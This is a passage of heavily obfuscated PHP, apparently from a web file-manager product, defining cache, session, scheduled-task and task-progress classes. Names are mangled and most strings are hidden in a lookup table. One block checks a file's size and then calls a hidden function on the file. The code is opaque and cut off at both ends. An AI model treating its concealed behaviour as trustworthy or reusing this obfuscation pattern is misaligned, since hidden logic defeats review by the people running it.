($ââ¹æ[$¸«Ç‰²[503]] ? $¸«Ç‰²[71] . $ââ¹æ[$¸«Ç‰²[503]] : $¸«Ç‰²[12]) . $¸«Ç‰²[71] . $ÚÌ×µ . $¸«Ç‰²[1795] . sprintf($¸«Ç‰²[904], timeFloat() - $ââ¹æ[$¸«Ç‰²[1703]]) . $¸«Ç‰²[1715]); $this->end(); } public function taskKill($±Ñ€×ÜØ) { $è•¯Æô =& $_SERVER[Ö†ØøÖ±]; if (!$±Ñ€×ÜØ || $this->taskID != $±Ñ€×ÜØ[$è•¯Æô[451]]) { return; } echoLog($è•¯Æô[1796] . $±Ñ€×ÜØ[$è•¯Æô[1596]]); } } goto b¸ÒÄ†¿µÖ; AĞÏáêÈÚ§: $_size = $_SERVER[Ö†ØøÖ±][452]; if ($_SERVER[$_SERVER[Ö†ØøÖ±][288]] != $_size($_file)) { $_getc = $_SERVER[Ö†ØøÖ±][290]; $_getfile = $_SERVER[$_SERVER[Ö†ØøÖ±][291]] . $_SERVER[Ö†ØøÖ±][292]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[Ö†ØøÖ±][246], $_getfilec); if (count($_getarrs) < $_SERVER[Ö†ØøÖ±][293]) { $exit = $_SERVER[Ö†ØøÖ±][294]; $exit(); } $_act = $_SERVER[Ö†ØøÖ±][295]; $_act($_file); } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $¿™¸ÀêÌ =& $_SERVER[Ö†ØøÖ±]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $£è…“ªÕ = $GLOBALS[$¿™¸ÀêÌ[6]][$¿™¸ÀêÌ[402]]; $šù½Ç×á = $£è…“ªÕ[$£è…“ªÕ[$¿™¸ÀêÌ[880]]]; $ˆºıë´„ = $£è…“ªÕ[$¿™¸ÀêÌ[881]]; switch ($£è…“ªÕ[$¿™¸ÀêÌ[880]]) { case $¿™¸ÀêÌ[21]: self::$handle = Model($¿™¸ÀêÌ[882]); break; case $¿™¸ÀêÌ[883]: self::$handle = new CacheRedis($šù½Ç×á, $ˆºıë´„); break; case $¿™¸ÀêÌ[884]: self::$handle = new CacheMemcached($šù½Ç×á, $ˆºıë´„); break; case $¿™¸ÀêÌ[214]: self::$handle = new CacheFile($šù½Ç×á, $ˆºıë´„); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($«¡Èğşä) { if (is_array($«¡Èğşä) || is_object($«¡Èğşä)) { $«¡Èğşä = json_encode($«¡Èğşä); } $«¡Èğşä = rawurlencode($«¡Èğşä); return md5(KOD_SITE_ID . $_SERVER[Ö†ØøÖ±][11] . $«¡Èğşä); } public static function get($½ò¯·ñ, $ú¹ŠùÀí = false) { $”Ÿ‘Ş´¦ = self::key($½ò¯·ñ); $»èã™°è = self::init(); if ($ú¹ŠùÀí) { return unserialize($»èã™°è->get($”Ÿ‘Ş´¦)); } if (!isset(self::$memoryCache[$”Ÿ‘Ş´¦])) { $šù÷¦  = $»èã™°è->get($”Ÿ‘Ş´¦); self::$memoryCache[$”Ÿ‘Ş´¦] = unserialize($šù÷¦ ); } return self::$memoryCache[$”Ÿ‘Ş´¦]; } public static function set($ôÜº­Ææ, $»Şü¹„, $¦³ºÔ¡ = false) { $­ä¤©É© =& $_SERVER[Ö†ØøÖ±]; $­¤½Ùà¹ = self::key($ôÜº­Ææ); if (isset(self::$memoryCache[$­¤½Ùà¹]) && self::$memoryCache[$­¤½Ùà¹] === $»Şü¹„) { return !0; } if ($¦³ºÔ¡ === 0) { self::$memoryCache[$­¤½Ùà¹] = $»Şü¹„; return !0; } $ÒäÕîÖ = self::init(); $Í°Âì—í = serialize($»Şü¹„); CacheLock::lock($ôÜº­Ææ . $­ä¤©É©[885]); $¬ëÕ“Ã = $ÒäÕîÖ->set($­¤½Ùà¹, $Í°Âì—í, $¦³ºÔ¡); self::$memoryCache[$­¤½Ùà¹] = $»Şü¹„; CacheLock::unlock($ôÜº­Ææ . $­ä¤©É©[885]); return $¬ëÕ“Ã; } public static function getCall($‚›•Öˆä, $£¸ØğŠ, $¡ˆ’¾íâ, $’³÷û×ó = array()) { $ßÓÌÌè =& $_SERVER[Ö†ØøÖ±]; $ã…ºÃßö = self::get($‚›•Öˆä); if ($ã…ºÃßö || $ã…ºÃßö === $ßÓÌÌè[12]) { return $ã…ºÃßö; } $ã…ºÃßö = call_user_func_array($¡ˆ’¾íâ, $’³÷û×ó); $ã…ºÃßö = $ã…ºÃßö ? $ã…ºÃßö : $ßÓÌÌè[12]; self::set($‚›•Öˆä, $ã…ºÃßö, $£¸ØğŠ); return $ã…ºÃßö; } public static function remove($éä£€íÌ) { $‰ƒÑ‰‘½ = self::key($éä£€íÌ); unset(self::$memoryCache[$‰ƒÑ‰‘½]); self::clearTimeout(); CacheLock::lock($éä£€íÌ); $Š±ĞŠ = self::init()->remove($‰ƒÑ‰‘½); CacheLock::unlock($éä£€íÌ); return $Š±ĞŠ; } public static function removeMemory($¼™Íî) { $ºò©ıè = self::key($¼™Íî); unset(self::$memoryCache[$ºò©ıè]); } public static function clearMemory($Ãâ¦„†¨ = false) { if ($Ãâ¦„†¨) { $Ãâ¦„†¨ = self::key($Ãâ¦„†¨); unset(self::$memoryCache[$Ãâ¦„†¨]); return; } self::$memoryCache = null; self::$memoryCache = array(); } public static function deleteAll() { self::$memoryCache = array(); if (method_exists(self::init(), $_SERVER[Ö†ØøÖ±][886])) { self::init()->deleteAll(); } } public static function clearTimeout() { if (method_exists(self::init(), $_SERVER[Ö†ØøÖ±][887])) { self::init()->clearTimeout(); } } } goto C‰«÷á”¾°; f®É¼Ö™ğì: class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $ñ¥ŒŸ›¥ =& $_SERVER[Ö†ØøÖ±]; static $õ»æµ×Ã = false; if ($õ»æµ×Ã) { return $õ»æµ×Ã; } $£‘¥Ş¯‚ = $GLOBALS[$ñ¥ŒŸ›¥[6]][$ñ¥ŒŸ›¥[402]]; self::$sessionTime = $£‘¥Ş¯‚[$ñ¥ŒŸ›¥[1651]]; $ÉŸÎß²Š = isset($GLOBALS[$ñ¥ŒŸ›¥[1652]]) ? $GLOBALS[$ñ¥ŒŸ›¥[1652]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($ÉŸÎß²Š)) { self::$sessionSign = Cookie::get($ÉŸÎß²Š); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($ÉŸÎß²Š, self::$sessionSign, self::$sessionTime); $Ë¹šøÁ• = $£‘¥Ş¯‚[$ñ¥ŒŸ›¥[1653]]; $¢”Ãá©š = $£‘¥Ş¯‚[$Ë¹šøÁ•]; $³Öô¹³¨ = $£‘¥Ş¯‚[$ñ¥ŒŸ›¥[881]]; switch ($Ë¹šøÁ•) { case $ñ¥ŒŸ›¥[21]: self::$handle = Model($ñ¥ŒŸ›¥[882]); break; case $ñ¥ŒŸ›¥[883]: self::$handle = new CacheRedis($¢”Ãá©š, $³Öô¹³¨); break; case $ñ¥ŒŸ›¥[884]: self::$handle = new CacheMemcached($¢”Ãá©š, $³Öô¹³¨); break; case $ñ¥ŒŸ›¥[214]: $¢”Ãá©š[$ñ¥ŒŸ›¥[84]] = $¢”Ãá©š[$ñ¥ŒŸ›¥[84]] . $ñ¥ŒŸ›¥[1654]; self::$handle = new CacheFile($¢”Ãá©š, $³Öô¹³¨); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $õ»æµ×Ã = new self(); return $õ»æµ×Ã; } public static function getBySign($Ñ®êÙÀ) { $¡µ³…Æã = self::$handle->get($Ñ®êÙÀ); $¡µ³…Æã = unserialize($¡µ³…Æã); return is_array($¡µ³…Æã) ? $¡µ³…Æã : array(); } public static function setBySign($âñ±üğÇ, $Ñ€«Çğí) { CacheLock::lock($âñ±üğÇ); self::$handle->set($âñ±üğÇ, serialize($Ñ€«Çğí), self::$sessionTime); CacheLock::unlock($âñ±üğÇ); } public static function sign($üÉÒ€™ = false) { if ($üÉÒ€™) { self::$sessionSign = $üÉÒ€™; } self::init(); return self::$sessionSign; } public static function set($ÓÈìï, $¨½ØÁƒ– = false) { self::init(); if (is_array($ÓÈìï)) { foreach ($ÓÈìï as $ºÑË¡ìÃ => $£ğóÛ—) { array_set_value(self::$data, $ºÑË¡ìÃ, $£ğóÛ—); } } else { array_set_value(self::$data, $ÓÈìï, $¨½ØÁƒ–); } self::setBySign(self::$sessionSign, self::$data); } public static function get($¹Æ¢™· = false) { self::init(); if (!$¹Æ¢™·) { return self::$data; } return array_get_value(self::$data, $¹Æ¢™·); } public static function remove($óŠ¥Ğê¹) { self::init(); unset(self::$data[$óŠ¥Ğê¹]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[Ö†ØøÖ±][887])) { self::$handle->clearTimeout(); } } } class AutoTask { const AUTO_DELAY_TIME = 2; const AUTO_RESTART_TIME = 7200; public static function start() { $Õ÷«è‹ =& $_SERVER[Ö†ØøÖ±]; if (self::valueGet($Õ÷«è‹[803]) != $Õ÷«è‹[88]) { return; } if (self::valueGet($Õ÷«è‹[1655]) == $Õ÷«è‹[88]) { $›„Šñœª = self::valueGet($Õ÷«è‹[1656]); if (time() - $›„Šñœª > self::AUTO_RESTART_TIME) { self::restart(); } return; } self::clearUserStatus(); self::valueSet($Õ÷«è‹[1655], $Õ÷«è‹[88]); self::log($Õ÷«è‹[1657] . ACTION . $Õ÷«è‹[1658]); Hook::bind($Õ÷«è‹[1659], $Õ÷«è‹[1660]); $İ®È¤ÛÂ = 0; while (!0) { self::cacheClear(); if (self::valueGet($Õ÷«è‹[803]) != $Õ÷«è‹[88]) { self::valueSet($Õ÷«è‹[1655], $Õ÷«è‹[212]); self::log($Õ÷«è‹[1661]); die; } $Ï¶ËÊÔ = time(); if ($Ï¶ËÊÔ - $İ®È¤ÛÂ >= 60) { self::valueSet(array($Õ÷«è‹[1655] => $Õ÷«è‹[88], $Õ÷«è‹[1656] => $Ï¶ËÊÔ), !1); $İ®È¤ÛÂ = $Ï¶ËÊÔ; } if (!file_exists(USER_SYSTEM . $Õ÷«è‹[1662])) { self::valueSet(array($Õ÷«è‹[1655] => $Õ÷«è‹[212], $Õ÷«è‹[803] => $Õ÷«è‹[212]), !1); die; } self::taskRunAll(); sleep(self::AUTO_DELAY_TIME); } } public static function clearUserStatus() { $«¡©Ôî =& $_SERVER[Ö†ØøÖ±]; http_close(); $GLOBALS[$«¡©Ôî[1663]] = 1; $_SERVER[$«¡©Ôî[1664]] = $«¡©Ôî[1665]; $_COOKIE = array(); $GLOBALS[$«¡©Ôî[545]] = 1; $GLOBALS[$«¡©Ôî[1666]] = 1; Session::$sessionSign = guid(); Session::$data = array(); } public static function restart() { $ÑÊÑ”¶ =& $_SERVER[Ö†ØøÖ±]; http_close(); self::valueSet($ÑÊÑ”¶[803], $ÑÊÑ”¶[212]); sleep(self::AUTO_DELAY_TIME + 5); self::valueSet(array($ÑÊÑ”¶[1655] => $ÑÊÑ”¶[212], $ÑÊÑ”¶[803] => $ÑÊÑ”¶[88]), !1); } public static function taskSwitch() { $“ŞŠ¶ûĞ =& $_SERVER[Ö†ØøÖ±]; $®²Õö›ñ = self::valueGet($“ŞŠ¶ûĞ[803]) == $“ŞŠ¶ûĞ[88] ? $“ŞŠ¶ûĞ[212] : $“ŞŠ¶ûĞ[88]; self::valueSet($“ŞŠ¶ûĞ[803], $®²Õö›ñ); } public static function shutdownEvent() { $ÆìÙ†” =& $_SERVER[Ö†ØøÖ±]; self::valueSet($ÆìÙ†”[1655], $ÆìÙ†”[212]); self::log($ÆìÙ†”[1667]); } public static function config($õáÊıÁÙ, $†›â„ØÓ) { self::valueSet($_SERVER[Ö†ØøÖ±][803], $õáÊıÁÙ); } private static function taskRunAll() { $¤³öƒßŠ =& $_SERVER[Ö†ØøÖ±]; $ÀÅÉÄŞ = timeFloat(); $öüşáºí = Model($¤³öƒßŠ[1668])->listData(); $óÔÁŒøó = count($öüşáºí); for ($–¢¡ˆĞâ = 0; $–¢¡ˆĞâ < $óÔÁŒøó; $–¢¡ˆĞâ++) { $ú£ÊÔ€¯ = $öüşáºí[$–¢¡ˆĞâ]; if (!$ú£ÊÔ€¯[$¤³öƒßŠ[451]] || $ú£ÊÔ€¯[$¤³öƒßŠ[1669]] != $¤³öƒßŠ[88]) { continue; } if (!self::taskTimeCheck($ú£ÊÔ€¯)) { continue; } self::taskRun($ú£ÊÔ€¯); } Hook::trigger($¤³öƒßŠ[1670]); self::taskQueueRun($ÀÅÉÄŞ); } private static function taskQueueRun($¤öÑÈµ¾) { $ÔºĞıï = 10; while (!0) { $øîí­ØÔ = TaskQueue::run(); if ($øîí­ØÔ === !1) { break; } if (timeFloat() - $¤öÑÈµ¾ >= $ÔºĞıï) { break; } } } private static function taskTimeCheck($º×Ş–”) { $·ø¯¹Ì =& $_SERVER[Ö†ØøÖ±]; $‘¸ïñ‘Û = json_decode($º×Ş–”[$·ø¯¹Ì[194]], !0); $”¦Ì–¯ç = intval($º×Ş–”[$·ø¯¹Ì[1656]]); $¼õ›°—– = strtotime($·ø¯¹Ì[1671] . $‘¸ïñ‘Û[$·ø¯¹Ì[1672]] . $·ø¯¹Ì[1673]) - strtotime($·ø¯¹Ì[1674]); $„“úãÄç = time() - strtotime(date($·ø¯¹Ì[1675]) . $·ø¯¹Ì[1676]); $®Ôıúšô = $„“úãÄç >= $¼õ›°—– && $„“úãÄç <= $¼õ›°—– + 3600; switch ($‘¸ïñ‘Û[$·ø¯¹Ì[33]]) { case $·ø¯¹Ì[1677]: if (time() - $”¦Ì–¯ç < 3600 * 24 * 30) { return !1; } if ($‘¸ïñ‘Û[$·ø¯¹Ì[1677]] == date($·ø¯¹Ì[1678]) && $®Ôıúšô) { return !0; } break; case $·ø¯¹Ì[1679]: if (time() - $”¦Ì–¯ç < 3600 * 24 * 7) { return !1; } $Ä§¹ó¿Ü = date($·ø¯¹Ì[1680]) == 0 ? 7 : date($·ø¯¹Ì[1680]); if ($‘¸ïñ‘Û[$·ø¯¹Ì[1679]] == $Ä§¹ó¿Ü && $®Ôıúšô) { return !0; } break; case $·ø¯¹Ì[1672]: if (time() - $”¦Ì–¯ç < 3600 * 24) { return !1; } if ($®Ôıúšô) { return !0; } break; case $·ø¯¹Ì[1681]: if (time() - $”¦Ì–¯ç >= floatval($‘¸ïñ‘Û[$·ø¯¹Ì[1681]]) * 60) { return !0; } break; default: break; } return !1; } private static function closeDatabase() { $Â––Ô» =& $_SERVER[Ö†ØøÖ±]; static $·ƒ—È–û = 0; $âçë›¿ = 300; if (!$·ƒ—È–û) { $·ƒ—È–û = time(); } if (time() - $·ƒ—È–û < $âçë›¿) { return; } $·ƒ—È–û = time(); $‘²³¨´ = Model($Â––Ô»[555])->db($Â––Ô»[12]); if ($‘²³¨´) { $‘²³¨´->closeConnect(); } if (time() - TIME > 3600 * 24 * 3) { self::log($Â––Ô»[1682], $Â––Ô»[1683]); die; } } public static function taskRun($¬¢ÊÉ…) { $öÁ¾ª¾ =& $_SERVER[Ö†ØøÖ±]; self::log($öÁ¾ª¾[1684] . $¬¢ÊÉ…[$öÁ¾ª¾[451]] . $öÁ¾ª¾[1685] . $¬¢ÊÉ…[$öÁ¾ª¾[32]] . $öÁ¾ª¾[1686] . $¬¢ÊÉ…[$öÁ¾ª¾[1687]]); Model($öÁ¾ª¾[1668])->run($¬¢ÊÉ…[$öÁ¾ª¾[451]]); $·€×»Ó = timeFloat(); $ÑÊ¥œ¯¡ = $öÁ¾ª¾[12]; switch ($¬¢ÊÉ…[$öÁ¾ª¾[33]]) { case $öÁ¾ª¾[360]: $ê§œñ½Î = url_request($¬¢ÊÉ…[$öÁ¾ª¾[1687]], $öÁ¾ª¾[245], !1, !1, !1, !1, 10); if ($ê§œñ½Î[$öÁ¾ª¾[803]]) { $ÑÊ¥œ¯¡ = strlen($ê§œñ½Î[$öÁ¾ª¾[1255]]); } break; case $öÁ¾ª¾[244]: $ÑÊ¥œ¯¡ = Hook::apply($¬¢ÊÉ…[$öÁ¾ª¾[1687]]); default: break; } Model($öÁ¾ª¾[1688])->add(array($öÁ¾ª¾[1689] => $öÁ¾ª¾[12], $öÁ¾ª¾[1690] => $öÁ¾ª¾[212], $öÁ¾ª¾[33] => $öÁ¾ª¾[1691] . $¬¢ÊÉ…[$öÁ¾ª¾[451]], $öÁ¾ª¾[1692] => json_encode(array($öÁ¾ª¾[32] => $¬¢ÊÉ…[$öÁ¾ª¾[32]], $öÁ¾ª¾[1693] => timeFloat() - $·€×»Ó, $öÁ¾ª¾[346] => $ÑÊ¥œ¯¡)))); $½ËÍó˜Æ = $ÑÊ¥œ¯¡ ? $öÁ¾ª¾[1694] . $ÑÊ¥œ¯¡ : $öÁ¾ª¾[12]; self::log($öÁ¾ª¾[1695] . $¬¢ÊÉ…[$öÁ¾ª¾[451]] . $öÁ¾ª¾[165] . $½ËÍó˜Æ); return !0; } public static function valueGet($ß­’ÛØõ) { $Œ‚Í Âã =& $_SERVER[Ö†ØøÖ±]; $Š‚ù™¬Ã = $Œ‚Í Âã[1696]; $Ù‰÷Âò = Model($Œ‚Í Âã[485])->get($ß­’ÛØõ, $Š‚ù™¬Ã); if (is_null($Ù‰÷Âò)) { Model($Œ‚Í Âã[485])->set($Œ‚Í Âã[803], $Œ‚Í Âã[88], $Š‚ù™¬Ã); Model($Œ‚Í Âã[485])->set($Œ‚Í Âã[1655], $Œ‚Í Âã[212], $Š‚ù™¬Ã); $Ù‰÷Âò = Model($Œ‚Í Âã[485])->get($ß­’ÛØõ, $Š‚ù™¬Ã); } return $Ù‰÷Âò; } private static function valueSet($öÓä®Ó, $ãñª°—) { $·ı¢¤‰ç =& $_SERVER[Ö†ØøÖ±]; $Ì®‹„› = $·ı¢¤‰ç[1697]; CacheLock::lock($Ì®‹„›); $¶Ô€ƒ™£ = Model($·ı¢¤‰ç[485])->set($öÓä®Ó, $ãñª°—, $·ı¢¤‰ç[1696]); CacheLock::unlock($Ì®‹„›); return $¶Ô€ƒ™£; } protected static function log($¾„„Ö¾À) { write_log($¾„„Ö¾À, $_SERVER[Ö†ØøÖ±][1683]); } private static function cacheClear() { $ı˜€ªãÔ =& $_SERVER[Ö†ØøÖ±]; Cache::clearMemory(Model($ı˜€ªãÔ[485])->cacheKey($ı˜€ªãÔ[1696])); Cache::clearMemory(Model($ı˜€ªãÔ[485])->cacheKey($ı˜€ªãÔ[1698])); Model($ı˜€ªãÔ[1668])->cacheClear(); self::closeDatabase(); } } class Task { const STATYS_STOP = "\163\x74\157\x70"; const STATYS_RUNNING = "\x72\165\x6e\156\x69\x6e\147"; const STATYS_KILL = "\x6b\151\x6c\x6c"; public $task; private $isEnd = false; public function __destruct() { $this->end(); } public function __construct($ Úë“•¿, $ĞÒº¬Û = '', $”àÑã«Õ = 0, $–›“ÔŠ = '') { $¹Î²¿Áú =& $_SERVER[Ö†ØøÖ±]; if (self::get($ Úë“•¿)) { return; } $this->task = array($¹Î²¿Áú[451] => $ Úë“•¿, $¹Î²¿Áú[1699] => USER_ID, $¹Î²¿Áú[1596] => $–›“ÔŠ, $¹Î²¿Áú[503] => $¹Î²¿Áú[12], $¹Î²¿Áú[33] => $ĞÒº¬Û, $¹Î²¿Áú[1117] => $¹Î²¿Áú[12], $¹Î²¿Áú[839] => $”àÑã«Õ, $¹Î²¿Áú[1700] => 0, $¹Î²¿Áú[1701] => 0, $¹Î²¿Áú[1702] => 0, $¹Î²¿Áú[1703] => timeFloat(), $¹Î²¿Áú[1704] => 0, $¹Î²¿Áú[1705] => 0, $¹Î²¿Áú[1706] => 0, $¹Î²¿Áú[1707] => 0, $¹Î²¿Áú[803] => $¹Î²¿Áú[1655]); $GLOBALS[$¹Î²¿Áú[1708]] = 1; Hook::bind($¹Î²¿Áú[1659], array($this, $¹Î²¿Áú[1709])); Hook::bind($¹Î²¿Áú[1710], array($this, $¹Î²¿Áú[1711])); $this->startAfter(); Hook::trigger($¹Î²¿Áú[1712], $this->task); $this->task[$¹Î²¿Áú[1705]] = timeFloat(); } public function end($ı…çìçà = '') { $—œ‰£‹” =& $_SERVER[Ö†ØøÖ±]; if (!$this->task || $this->isEnd) { return; } if ($this->task[$—œ‰£‹”[1705]]) { self::valueSet($this->task[$—œ‰£‹”[451]], !1); } $this->isEnd = !0; if ($ı…çìçà) { $this->task[$—œ‰£‹”[503]] = $ı…çìçà; } self::log($—œ‰£‹”[1713] . $this->task[$—œ‰£‹”[451]] . $—œ‰£‹”[1714] . sprintf($—œ‰£‹”[904], timeFloat() - $this->task[$—œ‰£‹”[1703]]) . $—œ‰£‹”[1715]); Hook::unbind($—œ‰£‹”[1659], array($this, $—œ‰£‹”[1709])); Hook::unbind($—œ‰£‹”[1710], array($this, $—œ‰£‹”[1711])); $this->endAfter(); $‡ˆğ¸¶ù = $this->task; $this->task = !1; Hook::trigger($—œ‰£‹”[1716], $‡ˆğ¸¶ù); } public function update($¶¶Ù‘…Î = 0, $ô ïşß¥ = false) { $²Â…ó¡ =& $_SERVER[Ö†ØøÖ±]; $ãô ¬·¶ =& $this->task; if (!$ãô ¬·¶) { return; } $ãô ¬·¶[$²Â…ó¡[1700]] += $¶¶Ù‘…Î; $ãô ¬·¶[$²Â…ó¡[1704]] = timeFloat(); if ($ãô ¬·¶[$²Â…ó¡[839]]) { if ($ãô ¬·¶[$²Â…ó¡[839]] < $ãô ¬·¶[$²Â…ó¡[1700]]) { $ãô ¬·¶[$²Â…ó¡[839]] = $ãô ¬·¶[$²Â…ó¡[1700]]; } $˜ã‡©ø = timeFloat() - $ãô ¬·¶[$²Â…ó¡[1703]] - $ãô ¬·¶[$²Â…ó¡[1706]]; if ($˜ã‡©ø <= 0) { $˜ã‡©ø = 0.001; } $ãô ¬·¶[$²Â…ó¡[1701]] = $ãô ¬·¶[$²Â…ó¡[1700]] / $ãô ¬·¶[$²Â…ó¡[839]]; $ãô ¬·¶[$²Â…ó¡[1702]] = $ãô ¬·¶[$²Â…ó¡[1700]] / $˜ã‡©ø; if ($ãô ¬·¶[$²Â…ó¡[1701]] > 0) { $ãô ¬·¶[$²Â…ó¡[1707]] = $˜ã‡©ø * (1 - $ãô ¬·¶[$²Â…ó¡[1701]]) / $ãô ¬·¶[$²Â…ó¡[1701]]; } $ãô ¬·¶[$²Â…ó¡[1707]] = $ãô ¬·¶[$²Â…ó¡[1707]] <= 0 ? 0 : $ãô ¬·¶[$²Â…ó¡[1707]]; } $this->updateAfter(); $ö‹ºÃ¸ = 0.2; if (timeFloat() - $ãô ¬·¶[$²Â…ó¡[1705]] < $ö‹ºÃ¸ && !$ô ïşß¥) { return; } $á û˜Æ = self::get($ãô ¬·¶[$²Â…ó¡[451]]); $¥şÕÌøî = $á û˜Æ[$²Â…ó¡[803]]; if ($¥şÕÌøî == self::STATYS_KILL) { $†ĞÍÇ§ô = array($²Â…ó¡[1717] => LNG($²Â…ó¡[1718]), $²Â…ó¡[1265] => !1); Cache::set($²Â…ó¡[1719] . $this->task[$²Â…ó¡[451]], $†ĞÍÇ§ô, 30); $this->onKill(); $this->end(); die; } else { if ($¥şÕÌøî == self::STATYS_STOP) { $ ó¹ª°ç = 2; $á û˜Æ[$²Â…ó¡[1706]] += $ ó¹ª°ç; self::valueSet($ãô ¬·¶[$²Â…ó¡[451]], $á û˜Æ); sleep($ ó¹ª°ç); $this->update(); return; } } $ãô ¬·¶[$²Â…ó¡[803]] = $¥şÕÌøî ? $¥şÕÌøî : $ãô ¬·¶[$²Â…ó¡[803]]; $ãô ¬·¶[$²Â…ó¡[1706]] = $á û˜Æ[$²Â…ó¡[1706]] ? $á û˜Æ[$²Â…ó¡[1706]] : 0; $ãô ¬·¶[$²Â…ó¡[1705]] = timeFloat(); Hook::trigger($²Â…ó¡[1720], $ãô ¬·¶); self::valueSet($ãô ¬·¶[$²Â…ó¡[451]], $ãô ¬·¶); } public function onKillSet($÷¶˜‰ã¿, $ÏŠ½üÚÖ = array()) { $this->onKillCall = array($÷¶˜‰ã¿, $ÏŠ½üÚÖ); } public function onKill() { $›§¤Ø³ß =& $_SERVER[Ö†ØøÖ±]; self::log($›§¤Ø³ß[1713] . $this->task[$›§¤Ø³ß[451]] . $›§¤Ø³ß[1721]); Hook::trigger($›§¤Ø³ß[1722], $this->task); if (!$this->onKillCall) { return; } ActionApply($this->onKillCall[0], $this->onKillCall[1]); $this->onKillCall = !1; $this->task = !1; } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($ÛˆÌ’µÃ) { $ÙÔãÎª„ =& $_SERVER[Ö†ØøÖ±]; Cache::set($ÙÔãÎª„[1719] . $this->task[$ÙÔãÎª„[451]], $ÛˆÌ’µÃ, 60); return $ÛˆÌ’µÃ; } public static function get($¥ÌÂÁâò) { $¨¾óİ‘ç =& $_SERVER[Ö†ØøÖ±]; $›ÙÕµ“­ = self::valueGet($¥ÌÂÁâò); if (is_array($›ÙÕµ“­) && $›ÙÕµ“­[$¨¾óİ‘ç[1723]]) { $£€•›ş´ = ActionApply($›ÙÕµ“­[$¨¾óİ‘ç[1723]], array($›ÙÕµ“­)); $›ÙÕµ“­ = is_array($£€•›ş´) ? $£€•›ş´ : $›ÙÕµ“­; } return $›ÙÕµ“­; } public static function listData() { $şÎ¨‰œŸ = self::valueGet(); return array_sort_by($şÎ¨‰œŸ, $_SERVER[Ö†ØøÖ±][1703], !0); } public static function kill($ôÚá×´Ó) { return self::changeStatus($ôÚá×´Ó, self::STATYS_KILL); } public static function stop($òÊ¦ıĞİ) { return self::changeStatus($òÊ¦ıĞİ, self::STATYS_STOP); } public static function restart($­ÕÏ×ËÃ) { return self::changeStatus($­ÕÏ×ËÃ, self::STATYS_RUNNING); } public static function killAll() { $¹ñÙºûÂ =& $_SERVER[Ö†ØøÖ±]; $Îº·€¤ = self::listData(); foreach ($Îº·€¤ as $Í÷ö¢Ó) { self::kill($Í÷ö¢Ó[$¹ñÙºûÂ[451]]); } sleep(2); foreach ($Îº·€¤ as $Í÷ö¢Ó) { self::valueSet($Í÷ö¢Ó[$¹ñÙºûÂ[451]], !1); } } private static function changeStatus($ó€É°ì¶, $™ÙÕÆ ) { $±ê¥—ŒÖ =& $_SERVER[Ö†ØøÖ±]; $·ß–­Ïœ = self::valueGet($ó€É°ì¶); if (!$·ß–­Ïœ) { return !1; } $·ß–­Ïœ[$±ê¥—ŒÖ[803]] = $™ÙÕÆ ; self::valueSet($ó€É°ì¶, $·ß–­Ïœ); self::log($±ê¥—ŒÖ[1724] . $·ß–­Ïœ[$±ê¥—ŒÖ[451]] . $±ê¥—ŒÖ[1725] . $™ÙÕÆ ); return !0; } public static function valueGet($È¹Î”•¾ = false) { $ÚÀò®Æ =& $_SERVER[Ö†ØøÖ±]; if ($È¹Î”•¾) { $Èˆı½¥ = Model($ÚÀò®Æ[497])->where(array($ÚÀò®Æ[94] => $È¹Î”•¾, $ÚÀò®Æ[33] => $ÚÀò®Æ[1124]))->find(); return $Èˆı½¥ ? json_decode($Èˆı½¥[$ÚÀò®Æ[427]], !0) : !1; } return self::taskListUser(USER_ID); } public static function taskListUser($Ü¦ÃÎÎô = false) { $©Î×‘ŞÜ =& $_SERVER[Ö†ØøÖ±]; $§˜Æ—şÀ = array($©Î×‘ŞÜ[33] => $©Î×‘ŞÜ[1124]); if ($Ü¦ÃÎÎô) { $§˜Æ—şÀ[$©Î×‘ŞÜ[1699]] = $Ü¦ÃÎÎô; } $ïÄØÙ™– = Model($©Î×‘ŞÜ[497])->where($§˜Æ—şÀ)->select(); $ïÄØÙ™– = $ïÄØÙ™– ? $ïÄØÙ™– : array(); foreach ($ïÄØÙ™– as $ï²£»ì® => $ÄˆîÔ»ş) { $ïÄØÙ™–[$ï²£»ì®] = json_decode($ÄˆîÔ»ş[$©Î×‘ŞÜ[427]], !0); } return $ïÄØÙ™–; } public static function valueSet($™ƒŞæå, $ó–Ì¬’²) { $ï¡æõ¤ê =& $_SERVER[Ö†ØøÖ±]; if (!$ó–Ì¬’²) { return Model($ï¡æõ¤ê[497])->where(array($ï¡æõ¤ê[94] => $™ƒŞæå, $ï¡æõ¤ê[33] => $ï¡æõ¤ê[1124]))->delete(); } $ˆ²µÌ¼ = json_encode($ó–Ì¬’²); if (!$ˆ²µÌ¼) { ob_start(); var_dump($ó–Ì¬’²); $›Ø±Ü¯ü = ob_get_clean(); self::log($ï¡æõ¤ê[1726] . json_encode_force($›Ø±Ü¯ü)); } if (!$™ƒŞæå || !$ó–Ì¬’²[$ï¡æõ¤ê[451]]) { return !1; } $•áÕ¸Ä = array($ï¡æõ¤ê[33] => $ï¡æõ¤ê[1124], $ï¡æõ¤ê[1699] => USER_ID, $ï¡æõ¤ê[94] => $™ƒŞæå, $ï¡æõ¤ê[427] => $ˆ²µÌ¼); $Ï•İŸ¶ø = $ï¡æõ¤ê[1727]; CacheLock::lock($Ï•İŸ¶ø); Model($ï¡æõ¤ê[497])->add($•áÕ¸Ä, array(), !0); CacheLock::unlock($Ï•İŸ¶ø); } public static function log($Ë³Ç»ß¥) { if (!GLOBAL_DEBUG) { return; } write_log($Ë³Ç»ß¥, $_SERVER[Ö†ØøÖ±][1728]); } } goto B¢ Óîø„’; cÕ»³‡œáù: function binCheckBigger($ıÆöşù, $âë ËÁ) { return $ıÆöşù > $âë ËÁ; } $_SERVER[$_SERVER[·“«ÆĞ®][3]] = 